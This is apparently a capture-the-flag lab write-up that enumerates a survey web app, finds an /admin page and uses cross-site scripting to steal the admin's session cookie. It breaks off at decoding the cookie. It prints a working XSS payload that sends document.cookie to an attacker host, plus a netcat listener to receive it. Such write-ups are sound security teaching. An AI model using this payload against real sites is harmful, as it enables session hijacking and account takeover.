## Initial Access

The lab already provides the target IP and port for the web service, so I went straight to the application in the browser to begin interacting with it.

<div align="center">

</div>

## Navigating the Application

Once the page loaded, I noticed a survey form as the main interaction point. This looked like the primary functionality of the application, so I proceeded by filling it out.

<div align="center">

</div>

After submitting the survey, the application returned a response page.

</div>

## Web Enumeration
To understand the attack surface better, I started enumerating available endpoints and directories.

<div align="center">
  <img width="967" height="486" alt="image" src="https://github.com/user-attachments/assets/47803bd2-ee67-4597-a8bb-abd27e22d289" />
</div>

During enumeration, I discovered an /admin page. Naturally, I accessed it to see if there was any direct entry point.

<div align="center">
  <img width="1206" height="886" alt="image" src="https://github.com/user-attachments/assets/311660f4-603f-4430-b553-99a951691e7e" />
</div>

The page did not immediately reveal anything useful, and my initial attempts did not lead to progress. At this point, I reviewed my approach and identified that the application was likely vulnerable to client-side injection.

## Exploiting XSS to Capture Admin Cookie

The application allowed input that was reflected back, which opened the possibility of exploiting a Cross Site Scripting vulnerability. I crafted a payload to capture the admin's session cookie.
```js
<script>fetch('http://<ip>:8000/?c='+document.cookie)</script>
```
Before triggering the payload, I set up a listener to catch the incoming request:

```
nc -lnvp 8000
```

I then injected the payload through the application input.

<div align="center">

</div>

After triggering it, I received a connection on my listener containing the admin cookie.

<div align="center">
  <img width="1219" height="323" alt="image" src="https://github.com/user-attachments/assets/9f08f830-f37f-48a7-8a20-7c488176561e" />
</div>

### Decoding the Cookie
With the captured cookie, I proceeded to decode it to extract meaningful information.

</div>
